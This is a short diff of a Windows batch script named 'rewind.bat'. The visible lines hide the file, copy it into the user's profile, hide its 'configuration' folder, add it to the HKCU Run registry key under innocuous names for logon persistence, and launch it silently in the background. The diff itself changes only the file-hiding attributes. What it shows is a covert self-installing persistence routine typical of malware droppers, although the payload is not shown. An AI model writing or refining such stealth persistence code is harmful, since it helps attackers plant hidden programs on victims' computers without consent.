@@ -30,7 +30,7 @@ IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 	rename "%FICHIER_TXT%" "rewind.bat"
 	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
-	attrib +s +h "C:\Users\%USERNAME%\configuration\rewind.bat"
+	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	start "" /B "C:\Users\%USERNAME%\configuration\rewind.bat"
 	goto rewind_2
 )
@@ -42,7 +42,7 @@ IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
 ) ELSE (
 	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
 	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
-	attrib +s +h "C:\Users\%USERNAME%\rewind.bat"
+	attrib +h "C:\Users\%USERNAME%\rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
 	goto end
 )
